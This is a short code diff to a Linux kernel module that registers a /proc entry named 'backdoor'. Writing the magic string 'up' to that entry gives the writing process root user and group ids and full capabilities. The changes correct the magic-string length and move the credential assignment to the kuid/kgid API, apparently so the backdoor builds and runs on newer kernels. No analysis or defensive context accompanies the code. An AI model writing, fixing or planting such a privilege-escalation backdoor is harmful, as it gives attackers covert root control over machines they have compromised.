@@ -9,7 +9,7 @@
 
 #define PROC_NAME "backdoor"
 #define MAGIC_STR "up"
-#define MAGIC_LEN 14
+#define MAGIC_LEN 2
 
 static ssize_t backdoor_write(struct file *file, const char __user *buffer,
                               size_t count, loff_t *off)
@@ -34,8 +34,8 @@ static ssize_t backdoor_write(struct file *file, const char __user *buffer,
 	{
         return -ENOMEM;
 	}
-    new->uid = new->euid = new->suid = new->fsuid = 0;
-    new->gid = new->egid = new->sgid = new->fsgid = 0;
+    new->uid = new->euid = new->suid = new->fsuid = make_kuid(&init_user_ns, 0);
+    new->gid = new->egid = new->sgid = new->fsgid = make_kgid(&init_user_ns, 0);
     new->user_ns = &init_user_ns;
 
     cap_set_full(&new->cap_effective);
